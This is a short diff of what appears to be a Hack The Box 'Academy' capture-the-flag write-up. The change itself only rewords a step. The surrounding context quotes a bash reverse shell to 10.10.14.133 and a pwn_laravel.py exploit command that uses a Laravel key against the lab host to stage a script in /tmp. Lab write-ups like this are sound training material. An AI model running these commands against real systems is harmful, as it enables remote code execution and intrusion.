@@ -282,7 +282,7 @@ bash -i >& /dev/tcp/10.10.14.133/1234 0>&1
 pasha.sh
 ```
 
-* Make socat executable
+* Make script executable
 ```
 ┌──(root💀kali)-[/home/kali/HTB/Academy]
 └─# /usr/bin/python3 pwn_laravel.py http://dev-staging-01.academy.htb/ dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= -c 'cd /tmp;chmod +x pasha.sh;ls'
